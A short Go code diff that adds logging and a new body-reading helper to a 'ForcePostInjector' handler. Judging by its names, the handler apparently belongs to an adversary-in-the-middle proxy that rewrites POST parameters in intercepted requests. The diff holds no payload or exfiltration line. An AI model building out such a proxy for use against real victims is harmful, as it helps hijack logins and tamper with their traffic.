@@ -3,6 +3,7 @@ package request
 import (
 	"bytes"
 	"io"
+	"log/slog"
 	"net/http"
 	"net/url"
 	"strconv"
@@ -12,7 +13,9 @@ import (
 )
 
 // ForcePostInjector adds or overrides POST parameters on matching requests.
-type ForcePostInjector struct{}
+type ForcePostInjector struct {
+	Logger *slog.Logger
+}
 
 func (h *ForcePostInjector) Name() string { return "ForcePostInjector" }
 
@@ -24,8 +27,9 @@ func (h *ForcePostInjector) Handle(ctx *aitm.ProxyContext, req *http.Request) er
 		if !forcePost.Path.MatchString(req.URL.Path) {
 			continue
 		}
-		bodyBytes, err := readAndRestoreBody(req)
+		bodyBytes, err := getRequestBody(ctx, req)
 		if err != nil {
+			h.Logger.Error("failed to read request body for force_post", "path", req.URL.Path, "error", err)
 			continue
 		}
 		if !checkForcePostConditions(forcePost.Conditions, bodyBytes) {
